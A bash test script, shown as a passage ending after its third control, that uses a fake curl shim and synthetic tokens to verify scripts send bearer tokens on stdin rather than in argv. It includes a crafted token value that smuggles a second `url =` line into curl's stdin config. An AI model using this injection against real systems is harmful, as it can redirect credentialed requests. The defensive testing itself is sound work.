#!/usr/bin/env bash
# Guard 2 of the argv-bearer sweep (#7843, plan 2026-10-06-chore-sweep-argv-bearer-tokens-
# to-curl-config-stdin): the CONVERSION BATTERY.
#
# PROPERTY. For every followthrough probe that holds a credentialed curl, a run that
# reaches the call records the bearer on curl's STDIN and never in curl's argument list;
# an unusable credential produces zero calls and never the script's PASS outcome; a
# stripped or rejected credential produces the script's TRANSIENT status, never PASS.
#
# THE CHOKEPOINT is a PATH-shim `curl` that every row runs the script under
# (`env -i PATH=<shim>:<symlink dir of needed real tools> HOME TMPDIR`, fail-closed
# gh/doppler/ssh stubs). It records each call to calls/<n>.argv (NUL-delimited) and
# calls/<n>.stdin (a `--data-binary @-` / `-d @-` body goes to calls/<n>.body), models real
# curl (reads stdin ONLY for `--config -`/`-K -`/`-H @-`/`--data-binary @-`/`-d @-`; an
# arity table for flags with values; -o, -D, -w in both the real-newline and `\n` forms;
# exit 22 on HTTP >= 400 with -f/--fail/--fail-with-body; exit 99 `UNMODELLED FLAG` for
# anything outside its table), parses stdin config lines against
# `^header = "[^"\\]*"$` and records INJECTED for any other line, and is AUTH-GATED: 200
# and a canned body only when `Authorization: Bearer <fixture>` arrives, else 401.
#
# INSTRUMENT CONTROLS run first and abort the suite with FATAL (a green battery over a
# blind shim is the failure this suite exists to prevent):
#   C1 a canonical-compliant synthetic probe must be GREEN;
#   C2 an argv-bearer synthetic probe must be RED on the 'token in recorded argv' check;
#   C3 the real-curl ORACLE: `curl --libcurl` against http://127.0.0.1:9/ (nothing
#      listens; no server needed) must show exactly one Authorization header append for
#      the stdin config form and a SECOND CURLOPT_URL for a hostile token
#      (quote + newline + `url = "..."`) -- so the shim's INJECTED model is calibrated to
#      the real tool, not to the author's belief about it.
#
# EVERY DERIVED PROBE ASSERTS THE FULL CONTRACT (bearer on stdin, token in no argv, hostile
# tokens refused, xtrace refusal, 100 KB pipefail). Baseline E (scripts/lint-shell-trace-
# credential-refusal-e.baseline.txt) lists only the deferred host-deployed infra scripts, so a
# followthrough probe reappearing there is itself a failure (population row below).
#
# THE POPULATION IS DERIVED (git ls-files scripts/followthroughs/*.sh holding a
# credentialed curl), never counted: each member must be in exactly one of the dynamic
# manifest, the static-only exclusions (with a justification and a row that goes RED when
# the probe becomes hermetically reachable) or the delegated list (owning test named).
#
# All tokens are SYNTHESIZED. No network, no Doppler, no real credential is ever read.
set -uo pipefail

REPO_ROOT="$(cd "$(dirname "${BASH_SOURCE[0]}")/../.." && pwd)"
cd "$REPO_ROOT" || { echo "FATAL: cannot cd to $REPO_ROOT" >&2; exit 2; }

pass=0; fail=0; CASES=0

# ONE scratch root, ONE EXIT trap, installed before anything is written under it.
TMPD="$(mktemp -d -t argv-bearer-sweep.XXXXXXXX)" || { echo "FATAL: mktemp failed" >&2; exit 2; }
trap 'rm -rf "$TMPD"' EXIT

# Canonical assert_fixture_dir — byte-identical copy (fixture-scan.py requires
# the verbatim body; see plugins/soleur/test/test-helpers.sh). Every fixture in
# this suite is written under $TMPD and the EXIT trap removes it recursively, so
# a relative or `..`-bearing root would put both the writes and the `rm -rf`
# somewhere other than the scratch dir.
assert_fixture_dir() {
  case "${1-}" in
    "") printf 'FATAL: fixture dir is EMPTY; git -C "" would operate on %s\n' "$PWD" >&2; exit 2 ;;
    */../*|*/..) printf 'FATAL: fixture dir %s contains ..; refusing\n' "$1" >&2; exit 2 ;;
    /proc/*|/sys/*|/dev/*) printf 'FATAL: fixture dir %s is a synthetic-fs path; refusing\n' "$1" >&2; exit 2 ;;
    /|//|/.) printf 'FATAL: fixture dir resolves to the filesystem root; refusing\n' >&2; exit 2 ;;
    /*) : ;;
    *)  printf 'FATAL: fixture dir %s is RELATIVE; refusing\n' "$1" >&2; exit 2 ;;
  esac
}
assert_fixture_dir "$TMPD"

_report() {
  local label="$1" status="$2" detail="${3:-}"
  if [[ "$status" == "ok" ]]; then
    pass=$((pass + 1)); echo "[ok] $label"
  else
    fail=$((fail + 1)); echo "[FAIL] $label $detail" >&2
  fi
}
# Every row goes through `row`, which counts at the CALL SITE. `pass + fail` is reconciled
# against CASES at the bottom, so a `_report` that silently stops counting cannot hide.
row() { CASES=$((CASES + 1)); _report "$@"; }

# INSTRUMENT SELF-TEST of the pass/fail helper. Both counters are moved only inside
# `_report`; a floor over `pass + fail` is computed from the very helper it backstops
# (measured elsewhere: routing the fail branch into `pass` left a suite green with two
# failing rows). Only driving the helper in BOTH directions can see that. Counters are
# restored so the row count stays exact. Failures are reported with printf + exit, never
# through the helpers they guard.
_selftest_report() {
  local p0=$pass f0=$fail c0=$CASES
  row "instrument self-test: ok moves pass" ok
  if [[ "$pass" -ne $((p0 + 1)) || "$fail" -ne "$f0" ]]; then
    printf '[FATAL] _report ok did not move pass alone (pass %s->%s, fail %s->%s)\n' "$p0" "$pass" "$f0" "$fail" >&2
    exit 2
  fi
  row "instrument self-test: fail moves fail (expected; retracted immediately)" fail
  if [[ "$fail" -ne $((f0 + 1)) || "$pass" -ne $((p0 + 1)) ]]; then
    printf '[FATAL] _report fail did not move fail alone (pass %s->%s, fail %s->%s)\n' "$p0" "$pass" "$f0" "$fail" >&2
    exit 2
  fi
  pass=$p0; fail=$f0; CASES=$c0
}
_selftest_report

# --------------------------------------------------------------------------------------
# TOOLING: the real tools a probe needs, symlinked into ONE dir. curl/gh/doppler/ssh/git are
# deliberately absent: the shim dir supplies curl, and the others are fail-closed stubs.
# --------------------------------------------------------------------------------------
BASH_BIN="$(type -P bash)" || { echo "FATAL: no bash" >&2; exit 2; }
REAL_CURL="$(type -P curl || true)"
[[ -n "$REAL_CURL" ]] || { echo "FATAL: no real curl for the --libcurl oracle (control C3)" >&2; exit 2; }
command -v jq >/dev/null 2>&1 || { echo "FATAL: jq is required (every probe parses with it)" >&2; exit 2; }
command -v git >/dev/null 2>&1 || { echo "FATAL: git is required (the population is derived from git ls-files)" >&2; exit 2; }

REALBIN="$TMPD/realbin"; SHIMDIR="$TMPD/shimbin"; SYN="$TMPD/synth"; BODIES="$TMPD/bodies"; ROWS="$TMPD/rows"
for d in "$REALBIN" "$SHIMDIR" "$SYN" "$BODIES" "$ROWS"; do
  assert_fixture_dir "$d"
  mkdir -p "$d"
done
for t in bash cat date grep egrep head tail jq sed tr awk sort uniq wc mktemp rm mkdir env dirname basename cut tee expr sleep readlink ls cp mv xargs true false id uname paste openssl stat; do
  p="$(type -P "$t" || true)"
  [[ -n "$p" ]] && ln -s "$p" "$REALBIN/$t"
done

# THE SHIM. A quoted heredoc so nothing expands at write time; the interpreter line is
# rewritten to the absolute bash afterwards (an `env -i` PATH has no /usr/bin/env guarantee).
cat > "$SHIMDIR/curl" <<'SHIM_EOF'
#!/usr/bin/env bash
# PATH-shim curl for tests/scripts/test-argv-bearer-sweep.sh. Synthesized fixtures only.
set -u
D="${SHIM_DIR:?SHIM_DIR unset}"
mkdir -p "$D/calls"
n=0
[[ -r "$D/counter" ]] && read -r n < "$D/counter"
n=$((n + 1))
printf '%s\n' "$n" > "$D/counter"
C="$D/calls/$n"
printf '%s\0' "$@" > "$C.argv"

unmodelled() {
  printf 'UNMODELLED FLAG: %s\n' "$1" >&2
  printf '%s\n' "$1" >> "$D/unmodelled"
  exit 99
}

args=("$@"); i=0
hdrs=(); urls=(); out=""; dump=""; wfmt=""; failmode=""
use_cfg_stdin=0; use_hdr_stdin=0; body_stdin=""

apply_value() { # $1 flag, $2 value
  case "$1" in
    -H|--header)
      case "$2" in
        @-) use_hdr_stdin=1 ;;
        @*) unmodelled "$1 @file" ;;
        *) hdrs+=("$2") ;;
      esac ;;
    -K|--config)
      if [[ "$2" == "-" ]]; then use_cfg_stdin=1; else unmodelled "$1 <file>"; fi ;;
    -w|--write-out)
      case "$2" in @*) unmodelled "$1 @file" ;; esac
      wfmt="$2" ;;
    -o|--output) out="$2" ;;
    -D|--dump-header) dump="$2" ;;
    -d|--data|--data-binary|--data-raw|--data-urlencode)
      # A body on STDIN (`@-`) is read below, once the whole argv is parsed. `--data-binary @-`
      # keeps CR/LF; `-d/--data @-` strips them, exactly as real curl does (calibrated by
      # control C4 against `curl --libcurl`). A body FILE is not modelled: no probe uses one.
      case "$2" in
        @-) case "$1" in
              --data-binary) body_stdin=binary ;;
              -d|--data) body_stdin=strip ;;
              *) unmodelled "$1 @- (body on stdin)" ;;
            esac ;;
        @*) unmodelled "$1 @file" ;;
      esac ;;
    -X|--request|-m|--max-time|--connect-timeout|--max-redirs|--proto|--proto-redir|--retry|--retry-delay|--retry-max-time|-A|--user-agent|-u|--user|-e|--referer|--noproxy) : ;;
    --url) urls+=("$2") ;;
    *) unmodelled "$1" ;;
  esac
}

while (( i < ${#args[@]} )); do
  a="${args[i]}"; i=$((i + 1))
  case "$a" in
    --disable|--silent|--show-error|--globoff|--get|--location|--compressed|--http1.1) : ;;
    --fail) failmode=fail ;;
    --fail-with-body) failmode=body ;;
    --*=*) apply_value "${a%%=*}" "${a#*=}" ;;
    --header|--write-out|--output|--dump-header|--request|--data|--data-binary|--data-raw|--data-urlencode|--max-time|--connect-timeout|--max-redirs|--proto|--proto-redir|--retry|--retry-delay|--retry-max-time|--user-agent|--user|--referer|--noproxy|--url|--config)
      (( i < ${#args[@]} )) || unmodelled "$a (missing value)"
      apply_value "$a" "${args[i]}"; i=$((i + 1)) ;;
    --) while (( i < ${#args[@]} )); do urls+=("${args[i]}"); i=$((i + 1)); done ;;
    --*) unmodelled "$a" ;;
    -?*)
      c="${a:1}"
      while [[ -n "$c" ]]; do
        ch="${c:0:1}"; c="${c:1}"
        case "$ch" in
          s|S|g|G|L) : ;;
          f) failmode=fail ;;
          H|w|o|D|X|d|m|K|u|A|e)
            if [[ -n "$c" ]]; then val="$c"; c=""
            else
              (( i < ${#args[@]} )) || unmodelled "-$ch (missing value)"
              val="${args[i]}"; i=$((i + 1))
            fi
            apply_value "-$ch" "$val" ;;
          *) unmodelled "-$ch" ;;
        esac
      done ;;
    *) urls+=("$a") ;;
  esac
done

mode="${SHIM_MODE:-auth}"
case "$mode" in auth|deny|noauth|noread|fail7) : ;; *) unmodelled "SHIM_MODE=$mode" ;; esac
case "${SHIM_AUTH:-bearer}" in bearer|hmac-cf) : ;; *) unmodelled "SHIM_AUTH=${SHIM_AUTH}" ;; esac

# stdin is read ONLY for the forms real curl reads it for.
if [[ -n "$body_stdin" ]]; then
  data="$(cat; printf x)"; data="${data%x}"
  if [[ "${SHIM_MUTATE:-}" != nobody ]]; then
    if [[ "$body_stdin" == strip ]]; then printf '%s' "$data" | tr -d '\r\n' > "$C.body"; else printf '%s' "$data" > "$C.body"; fi
  fi
fi
if (( use_cfg_stdin || use_hdr_stdin )); then
  if [[ "$mode" == noread ]]; then
    : > "$C.stdin-unread"
  else
    data="$(cat; printf x)"; data="${data%x}"
    [[ "${SHIM_MUTATE:-}" == nostdin ]] || printf '%s' "$data" > "$C.stdin"
    lineno=0
    while IFS= read -r line || [[ -n "$line" ]]; do
      lineno=$((lineno + 1))
      [[ -z "$line" || "$line" == \#* ]] && continue
      if (( use_cfg_stdin )); then
        if [[ "$line" =~ ^header\ =\ \"([^\"\\]*)\"$ ]]; then
          hdrs+=("${BASH_REMATCH[1]}")
        else
          # The line CONTENT is never written: it may be the secret itself.
          printf 'INJECTED: stdin config line %s is not a bare header directive\n' "$lineno" >> "$C.injected"
        fi
      else
        if [[ "$line" =~ ^[A-Za-z][A-Za-z0-9-]*:\  ]]; then
          hdrs+=("$line")
        else
          printf 'INJECTED: stdin header line %s is not Name: value\n' "$lineno" >> "$C.injected"
        fi
      fi
    done < <(printf '%s' "$data")
  fi
fi

url="${urls[0]:-}"
hostpart="${url#*://}"; hostpart="${hostpart%%[/?#]*}"; hostpart="${hostpart##*@}"; hostpart="${hostpart%%:*}"
printf '%s\n' "$hostpart" > "$C.host"
# fail7: a transport failure (curl exit 7, connection refused), calibrated against real curl (control C4).
if [[ "$mode" == fail7 ]]; then printf 'curl: (7) Failed to connect\n' >&2; exit 7; fi

have_auth=0
for h in "${hdrs[@]:-}"; do
  [[ -n "${SHIM_FIXTURE_TOKEN:-}" && "$h" == "Authorization: ${SHIM_SCHEME:-Bearer} ${SHIM_FIXTURE_TOKEN}" ]] && have_auth=1
done
# Auth profile `hmac-cf` (S2-C): the deploy-webhook request shape. It is NOT shape-only: the digest is RECOMPUTED here over
# the recorded request body (empty when none was recorded) with SHIM_HMAC_KEY through the REAL openssl, and both Cloudflare
# Access values are compared exactly, so a hard-coded 64-zero digest, a wrong key, a body mismatch or a stale value is a 401.
if [[ "${SHIM_AUTH:-bearer}" == hmac-cf ]]; then
  have_auth=0; sig=""; cfid=""; cfsec=""
  for h in "${hdrs[@]:-}"; do
    case "$h" in
      "X-Signature-256: sha256="*) sig="${h#X-Signature-256: sha256=}" ;;
      "CF-Access-Client-Id: "*) cfid="${h#CF-Access-Client-Id: }" ;;
      "CF-Access-Client-Secret: "*) cfsec="${h#CF-Access-Client-Secret: }" ;;
    esac
  done
  bodyf="$C.body"; [[ -e "$bodyf" ]] || bodyf=/dev/null
  want="$("@REAL_OSSL@" dgst -sha256 -hmac "${SHIM_HMAC_KEY:-}" < "$bodyf" | sed 's/.*= //')"
  [[ -n "${SHIM_HMAC_KEY:-}" && -n "$want" && "$sig" == "$want" && -n "$cfid" && -n "$cfsec" \
     && "$cfid" == "${SHIM_CF_ID:-}" && "$cfsec" == "${SHIM_CF_SECRET:-}" ]] && have_auth=1
fi

case "$mode" in
  deny) status=401 ;;
  noauth|noread) status=200 ;;
  auth) if (( have_auth )); then status=200; else status=401; fi ;;
esac
[[ "${SHIM_MUTATE:-}" == noauth ]] && status=200
[[ -n "${SHIM_STATUS:-}" ]] && status="$SHIM_STATUS"

if (( status == 200 )) || (( status < 400 )); then
  if [[ -n "${SHIM_BODY_FILE:-}" ]]; then body="$(cat "$SHIM_BODY_FILE"; printf x)"; body="${body%x}"
  else body='{"data":[]}'; fi
else
  body='{"detail":"Invalid token"}'
fi

expand_w() {
  local s="$1" o=""
  while [[ -n "$s" ]]; do
    case "$s" in
      '%{http_code}'*) o+="$status"; s="${s#'%{http_code}'}" ;;
      '%{'*) unmodelled "-w ${s%%\}*}}" ;;
      '%%'*) o+="%"; s="${s#%%}" ;;
      '\n'*) o+=$'\n'; s="${s#\\n}" ;;
      '\r'*) o+=$'\r'; s="${s#\\r}" ;;
      '\t'*) o+=$'\t'; s="${s#\\t}" ;;
      '\\'*) o+='\'; s="${s#\\\\}" ;;
      *) o+="${s:0:1}"; s="${s:1}" ;;
    esac
  done
  printf '%s' "$o"
}

failed=0
if (( status >= 400 )) && [[ -n "$failmode" ]]; then failed=1; fi

hdr_block="HTTP/2 ${status}"$'\r\n'
[[ -n "${SHIM_LINK_HEADER:-}" ]] && hdr_block+="link: ${SHIM_LINK_HEADER}"$'\r\n'
hdr_block+=$'\r\n'
if [[ -n "$dump" ]]; then
  if [[ "$dump" == "-" ]]; then printf '%s' "$hdr_block"; else printf '%s' "$hdr_block" > "$dump"; fi
fi
if (( failed )) && [[ "$failmode" == fail ]]; then
  :
elif [[ -n "$out" ]]; then
  printf '%s' "$body" > "$out"
else
  printf '%s' "$body"
fi
[[ -n "$wfmt" ]] && expand_w "$wfmt"
if (( failed )); then
  printf 'curl: (22) The requested URL returned error: %s\n' "$status" >&2
  exit 22
fi
exit 0
SHIM_EOF
sed -i "1s|.*|#!${BASH_BIN}|" "$SHIMDIR/curl"
chmod +x "$SHIMDIR/curl"
# `jq` shim: records its argv (a `jq --arg pw "$PW"` regression is invisible to the curl shim: jq's own
# argv is world-readable too) and then runs the real jq. Passthrough, so every probe is unchanged.
REAL_JQ="$(type -P jq)"
cat > "$SHIMDIR/jq" <<'JQ_EOF'
#!/usr/bin/env bash
D="${SHIM_DIR:-}"
if [[ -n "$D" ]]; then
  mkdir -p "$D/jq"; n=0
  [[ -r "$D/jq/counter" ]] && read -r n < "$D/jq/counter"
  n=$((n + 1)); printf '%s\n' "$n" > "$D/jq/counter"
  printf '%s\0' "$@" > "$D/jq/$n.argv"
fi
exec "@REAL_JQ@" "$@"
JQ_EOF
sed -i "1s|.*|#!${BASH_BIN}|; s|@REAL_JQ@|${REAL_JQ}|" "$SHIMDIR/jq"
chmod +x "$SHIMDIR/jq"
for t in gh doppler ssh; do
  printf '#!%s\nset -u\nprintf "%%s\\n" "%s" >> "${SHIM_DIR:-/dev/null}/unexpected"\nprintf "UNEXPECTED CALL to %s (fail-closed stub)\\n" >&2\nexit 97\n' "$BASH_BIN" "$t" "$t" > "$SHIMDIR/$t"
  chmod +x "$SHIMDIR/$t"
done

# The ONE fixture credential. Synthesized, never a real value.
FIXTURE_TOKEN="synthetic-fixture-token-0001"

# run_probe <rowname> <script> [NAME=value ...]  -> RUN_RC, $ROWS/<rowname>/{stdout,stderr,shim/}
# RUN_FLAGS (array) holds extra `bash` flags for this one call (e.g. -x). Every run is under
# `env -i`, so the only environment a probe sees is the one spelled out here.
RUN_RC=0; RUN_ROW=""; RUN_FLAGS=(); RUN_ARGS=(); RUN_EXTRA_PATH=""
run_probe() {
  local name="$1" script="$2"; shift 2
  RUN_ROW="$ROWS/$name"
  assert_fixture_dir "$RUN_ROW"
  mkdir -p "$RUN_ROW/home" "$RUN_ROW/tmp" "$RUN_ROW/shim"
  (
    cd "$RUN_ROW" || exit 99
    env -i PATH="${RUN_EXTRA_PATH:+$RUN_EXTRA_PATH:}$SHIMDIR:$REALBIN" HOME="$RUN_ROW/home" TMPDIR="$RUN_ROW/tmp" \
      SHIM_DIR="$RUN_ROW/shim" SHIM_FIXTURE_TOKEN="$FIXTURE_TOKEN" "$@" \
      "$BASH_BIN" ${RUN_FLAGS[@]+"${RUN_FLAGS[@]}"} "$script" ${RUN_ARGS[@]+"${RUN_ARGS[@]}"} < /dev/null > "$RUN_ROW/stdout" 2> "$RUN_ROW/stderr"
  )
  RUN_RC=$?
}

# --------------------------------------------------------------------------------------
# EVALUATION. Sets EV_FAILED to a space-separated list of failed check NAMES (empty = GREEN),
# so a mutation row can assert WHICH check fired, not merely that something did.
#   calls-below-min      fewer calls to the manifest hosts than min_calls
#   bearer-not-on-stdin  a call to a manifest host whose stdin did not carry the bearer
#   token-in-argv        the token marker appears in ANY recorded argv
#   token-in-jq-argv     the token marker appears in ANY recorded jq argv (the jq shim)
#   injected             the shim recorded an INJECTED stdin line
#   unexpected-host      a call to a host outside the manifest
#   unexpected-tool      a gh/doppler/ssh stub was called
#   unmodelled-flag      the probe used a curl flag the shim does not model
#   token-in-output      the token marker is in the probe's stdout or stderr
#   bash-error           a `<script>: line N:` bash error in stderr
# --------------------------------------------------------------------------------------
EV_FAILED=""; EV_CALLS=0; EV_HOST_CALLS=0
count_calls() { # <rowdir> -> sets EV_CALLS
  local f; EV_CALLS=0
  for f in "$1"/shim/calls/*.argv; do [[ -e "$f" ]] && EV_CALLS=$((EV_CALLS + 1)); done
  return 0
}
evaluate() { # <rowdir> <hosts-regex> <min_calls> <token-or-marker> [scheme, default Bearer]
  local row="$1" hosts="$2" min="$3" tok="$4" scheme="${5:-Bearer}" f c h
  EV_FAILED=""; EV_HOST_CALLS=0; count_calls "$row"
  for f in "$row"/shim/calls/*.argv; do
    [[ -e "$f" ]] || continue
    c="${f%.argv}"; h=""
    [[ -r "$c.host" ]] && h="$(<"$c.host")"
    if [[ "$h" =~ ^(${hosts})$ ]]; then
      EV_HOST_CALLS=$((EV_HOST_CALLS + 1))
      if ! { [[ -r "$c.stdin" ]] && { grep -qxF -- "header = \"Authorization: $scheme $tok\"" "$c.stdin" || grep -qxF -- "Authorization: $scheme $tok" "$c.stdin"; }; }; then
        EV_FAILED+=" bearer-not-on-stdin"
      fi
    else
      EV_FAILED+=" unexpected-host"
    fi
    grep -aqF -- "$tok" "$f" && EV_FAILED+=" token-in-argv"
    [[ -s "$c.injected" ]] && EV_FAILED+=" injected"
  done
  for f in "$row"/shim/jq/*.argv; do
    [[ -e "$f" ]] || continue
    grep -aqF -- "$tok" "$f" && EV_FAILED+=" token-in-jq-argv"
  done
  (( EV_HOST_CALLS < min )) && EV_FAILED+=" calls-below-min"
  [[ -e "$row/shim/unexpected" ]] && EV_FAILED+=" unexpected-tool"
  [[ -e "$row/shim/unmodelled" ]] && EV_FAILED+=" unmodelled-flag"
  if grep -aqF -- "$tok" "$row/stdout" "$row/stderr" 2>/dev/null; then EV_FAILED+=" token-in-output"; fi
  if grep -aqE ': line [0-9]+: ' "$row/stderr" 2>/dev/null; then EV_FAILED+=" bash-error"; fi
  # de-duplicate, keep order
  EV_FAILED="$(printf '%s\n' $EV_FAILED | awk '!s[$0]++' | paste -sd' ' -)"
  return 0
}
has_check() { [[ " $EV_FAILED " == *" $1 "* ]]; }

# A TRANSIENT-style outcome: rc 2, never PASS, a TRANSIENT marker on stderr, no bash error.
transient_outcome() { # <rowdir> <rc>
  local row="$1" rc="$2"
  [[ "$rc" -eq 2 ]] || return 1
  grep -q '^PASS' "$row/stdout" && return 1
  grep -q 'TRANSIENT' "$row/stderr" || return 1
  grep -aqE ': line [0-9]+: ' "$row/stderr" && return 1
  return 0
}

# --------------------------------------------------------------------------------------
# SYNTHETIC PROBES. Modelled on the followthrough probes (xtrace refusal, token guard,
# curl, TRANSIENT/PASS/FAIL contract). Variants are assembled from fragments so each
# mutation differs from the canonical in exactly one place.
# --------------------------------------------------------------------------------------
SYN_HOST='synthetic\.example\.test'
SYN_URL='https://synthetic.example.test/api/0/ok'
synth_head() {
  cat <<'EOF'
#!/usr/bin/env bash
set -uo pipefail
case "$-" in
  *x*)
    if [ -n "${SYNTH_TOKEN:+x}" ]; then
      printf '[FATAL] refusing to run under xtrace with a live credential set (SYNTH_TOKEN).\n' >&2
      exit 78
    fi
    ;;
esac
EOF
}
synth_guard() {
  cat <<'EOF'
_bearer_ok() { local LC_ALL=C; case "${1:-}" in ''|*[!A-Za-z0-9._~+/=-]*) return 1 ;; esac; }
if ! _bearer_ok "${SYNTH_TOKEN:-}"; then echo "TRANSIENT: token unusable" >&2; exit 2; fi
EOF
}
synth_tail() {
  cat <<'EOF'
rc=$?
if [[ "$rc" -ne 0 ]]; then echo "TRANSIENT: curl rc=$rc" >&2; exit "$rc"; fi
HTTP_STATUS=$(printf '%s' "$RESP" | sed -n 's/^HTTP_STATUS://p' | tr -d '[:space:]')
BODY=$(printf '%s' "$RESP" | sed '$d')
if [[ "$HTTP_STATUS" != "200" ]]; then echo "TRANSIENT: API returned $HTTP_STATUS" >&2; exit 2; fi
N=$(printf '%s' "$BODY" | jq -r '.data | length // 0' 2>/dev/null)
if ! [[ "$N" =~ ^[0-9]+$ ]]; then echo "TRANSIENT: unparseable body" >&2; exit 2; fi
if [[ "$N" -eq 0 ]]; then echo "PASS: 0 events"; exit 0; fi
echo "FAIL: $N events"; exit 1
EOF
}
# call fragments (each ends the `RESP=` assignment; synth_tail starts with `rc=$?`)
synth_call() { # <variant>
  case "$1" in
    canonical) cat <<EOF
RESP=\$(curl --disable --noproxy '*' -sS -w '\nHTTP_STATUS:%{http_code}' \\
  --config - -H "Accept: application/json" \\
  "$SYN_URL" \\
  < <(printf 'header = "Authorization: Bearer %s"\n' "\${SYNTH_TOKEN}"))
EOF
    ;;
    argv) cat <<EOF
RESP=\$(curl --disable --noproxy '*' -sS -w '\nHTTP_STATUS:%{http_code}' \\
  -H "Authorization: Bearer \${SYNTH_TOKEN}" -H "Accept: application/json" \\
  "$SYN_URL")
EOF
    ;;
    pipe) cat <<EOF
RESP=\$(printf 'header = "Authorization: Bearer %s"\n' "\${SYNTH_TOKEN}" | curl --disable --noproxy '*' -sS -w '\nHTTP_STATUS:%{http_code}' \\
  --config - -H "Accept: application/json" \\
  "$SYN_URL")
EOF
    ;;
    hdrfile) cat <<EOF
RESP=\$(printf 'Authorization: Bearer %s\n' "\${SYNTH_TOKEN}" | curl --disable --noproxy '*' -sS -w '\nHTTP_STATUS:%{http_code}' \\
  -H @- -H "Accept: application/json" \\
  "$SYN_URL")
EOF
    ;;
    wrapper) cat <<EOF
synth_curl() {
  _bearer_ok "\${SYNTH_TOKEN:-}" || { echo "synth_curl: token unusable" >&2; return 2; }
  curl --disable --noproxy '*' "\$@" --config - \\
    < <(printf 'header = "Authorization: Bearer %s"\n' "\${SYNTH_TOKEN}")
}
RESP=\$(synth_curl -sS -w '\nHTTP_STATUS:%{http_code}' -H "Accept: application/json" "$SYN_URL")
EOF
    ;;
    two-curls-second-argv) cat <<EOF
FIRST=\$(curl --disable --noproxy '*' -sS -o /dev/null -w '%{http_code}' \\
  --config - "$SYN_URL" \\
  < <(printf 'header = "Authorization: Bearer %s"\n' "\${SYNTH_TOKEN}"))
RESP=\$(curl --disable --noproxy '*' -sS -w '\nHTTP_STATUS:%{http_code}' \\
  -H "Authorization: Bearer \${SYNTH_TOKEN}" "$SYN_URL")
EOF
    ;;
    bot) cat <<EOF
RESP=\$(curl --disable --noproxy '*' -sS -w '\nHTTP_STATUS:%{http_code}' \\
  --config - -H "Accept: application/json" \\
  "$SYN_URL" \\
  < <(printf 'header = "Authorization: Bot %s"\n' "\${SYNTH_TOKEN}"))
EOF
    ;;
    *) echo "FATAL: unknown synth variant $1" >&2; exit 2 ;;
  esac
}
make_synth() { # <variant> [noguard] -> path
  local v="$1" guard="${2:-guard}" p="$SYN/synth-$1${2:+-$2}.sh"
  { synth_head; [[ "$guard" == noguard ]] || synth_guard; synth_call "$v"; synth_tail; } > "$p"
  printf '%s\n' "$p"
}

# canned bodies
printf '%s' '{"data":[]}' > "$BODIES/sentry_empty.json"
printf '%s' '{"data":[{"title":"synthetic","timestamp":"2026-10-01T00:00:00"}]}' > "$BODIES/sentry_events.json"
printf '%s' "[{\"dateAdded\":\"$(date -u -d '1 day ago' +%Y-%m-%dT%H:%M:%SZ)\",\"status\":\"ok\"}]" > "$BODIES/checkins.json"
printf '%s' '[{"relname":"user_concurrency_slots","autovacuum_count":142,"stats_reset":null},{"relname":"mint_rate_window","autovacuum_count":50,"stats_reset":null},{"relname":"runtime_mint_intent","autovacuum_count":49,"stats_reset":null}]' > "$BODIES/autovac.json"
printf '%s' '[{"relname":"user_concurrency_slots","n_tup_upd":7635,"n_tup_ins":700,"stats_reset":null}]' > "$BODIES/slots.json"
printf '%s' '{"data":[{"attributes":{"name":"soleur-web-zot-consumer-web-1","status":"up"}},{"attributes":{"name":"soleur-web-nic-guard-web-1","status":"up"}},{"attributes":{"name":"soleur-git-data-prd","status":"up"}},{"attributes":{"name":"soleur-web-zot-consumer-web-2","status":"up"}},{"attributes":{"name":"soleur-web-nic-guard-web-2","status":"up"}}]}' > "$BODIES/bs_up.json"

# =====================================================================================
# INSTRUMENT CONTROLS (abort with FATAL; counted as rows when they pass)
# =====================================================================================
fatal() { printf '[FATAL] instrument control failed: %s\n' "$1" >&2; exit 2; }

# C1: the canonical-compliant synthetic probe must be GREEN.
P_CANON="$(make_synth canonical)"
run_probe c1-canonical "$P_CANON" "SYNTH_TOKEN=$FIXTURE_TOKEN"
C1_RC=$RUN_RC
evaluate "$ROWS/c1-canonical" "$SYN_HOST" 1 "$FIXTURE_TOKEN"
if [[ "$C1_RC" -ne 0 || -n "$EV_FAILED" ]] || ! grep -q '^PASS' "$ROWS/c1-canonical/stdout"; then
  fatal "C1 canonical-compliant synthetic probe is not GREEN (rc=$C1_RC failed='$EV_FAILED')"
fi
row "control C1: canonical-compliant synthetic probe is GREEN (rc 0, PASS, bearer on stdin only)" ok

# C2: an argv-bearer synthetic probe must be RED on the 'token in recorded argv' check.
P_ARGV="$(make_synth argv)"
run_probe c2-argv "$P_ARGV" "SYNTH_TOKEN=$FIXTURE_TOKEN"
evaluate "$ROWS/c2-argv" "$SYN_HOST" 1 "$FIXTURE_TOKEN"
has_check token-in-argv || fatal "C2 argv-bearer synthetic probe was not caught on token-in-argv (failed='$EV_FAILED')"
has_check calls-below-min && fatal "C2 argv-bearer probe made no calls; RED must come from the argv check, not from silence"
row "control C2: argv-bearer synthetic probe is RED on 'token in recorded argv' (not on silence)" ok

# C3: the REAL-CURL ORACLE. The shim's model of the stdin config channel is calibrated against
# curl itself: `--libcurl` writes the C program curl WOULD run. Nothing listens on port 9, so the
# transfer fails with rc 7 -- the generated program is still written.
ORA="$TMPD/oracle"; assert_fixture_dir "$ORA"; mkdir -p "$ORA"
printf 'header = "Authorization: Bearer %s"\n' "$FIXTURE_TOKEN" \
  | "$REAL_CURL" --disable --noproxy '*' -sS --max-time 3 --libcurl "$ORA/ok.c" --config - http://127.0.0.1:9/ >/dev/null 2>&1 || true
HOSTILE="$(printf 'SYNTHMARK0001"\nurl = "http://127.0.0.1:9/second')"
printf 'header = "Authorization: Bearer %s"\n' "$HOSTILE" \
  | "$REAL_CURL" --disable --noproxy '*' -sS --max-time 3 --libcurl "$ORA/hostile.c" --config - http://127.0.0.1:9/ >/dev/null 2>&1 || true
[[ -s "$ORA/ok.c" && -s "$ORA/hostile.c" ]] || fatal "C3 real curl did not write --libcurl output (curl built without --libcurl?)"
ora_appends=$(grep -c 'curl_slist_append(slist1, "Authorization: Bearer' "$ORA/ok.c" || true)
ora_urls_ok=$(grep -c 'CURLOPT_URL' "$ORA/ok.c" || true)
ora_urls_hostile=$(grep -c 'CURLOPT_URL' "$ORA/hostile.c" || true)
[[ "$ora_appends" -eq 1 ]] || fatal "C3 oracle: expected exactly one Authorization append for the stdin config form, saw $ora_appends"
[[ "$ora_urls_ok" -eq 1 ]] || fatal "C3 oracle: expected one CURLOPT_URL for a clean token, saw $ora_urls_ok"
[[ "$ora_urls_hostile" -eq 2 ]] || fatal "C3 oracle: expected a SECOND CURLOPT_URL for the hostile token (config injection), saw $ora_urls_hostile"
